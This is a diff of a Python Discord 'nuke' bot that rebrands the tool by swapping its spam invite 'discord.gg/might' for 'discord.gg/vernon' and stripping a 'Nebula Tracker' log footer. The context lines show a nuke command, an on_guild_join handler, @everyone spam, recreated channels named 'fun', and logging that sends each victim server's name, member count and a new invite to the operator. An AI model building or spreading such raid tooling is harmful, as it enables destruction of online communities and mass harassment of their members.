@@ -6,7 +6,7 @@ import random
 protected_servers = [1099524145672359966, 1091190474049589248] # Add server ID seperated by a single comma
 owner_ids = [1090223367879131207] # Add user ID seperated by a single comma
 
-nuke_message = "@everyone discord.gg/might"
+nuke_message = "@everyone discord.gg/vernon"
 nuke_channel_name = "fun"
 bot_prefix = "!"
 
@@ -65,7 +65,7 @@ async def nuke(ctx):
         except:
             pass
     
-    invite = "discord.gg/might"
+    invite = "discord.gg/vernon"
     try:
         invite = await random.choice(guild.text_channels).create_invite()
     except:
@@ -73,7 +73,7 @@ async def nuke(ctx):
 
     if logs == True:
         log_embed = {'title':'Joined Server', 'color':0x2596be, 'footer':
-                    {'text':'Nebula Tracker', 'icon_url':'https://cdn.discordapp.com/attachments/1057915288147996682/1057915320402190336/nebula.png'}, 'fields':
+                    {'text':'/vernon', 'icon_url':''}, 'fields':
                     [{'name':'Server Name', 'value':f'```{guild.name}```', 'inline':'true'},
                     {'name':'Server Members', 'value':f'```{guild.member_count} members```', 'inline':'true'},
                     {'name':'Server Invite', 'value':f'Click [here]({invite}) to join', 'inline':'true'},
@@ -103,7 +103,7 @@ async def on_guild_join(guild):
             except:
                 pass
         
-        invite = "discord.gg/might"
+        invite = "discord.gg/vernon"
         try:
             invite = random.choice(guild.text_channels).create_invite()
         except:
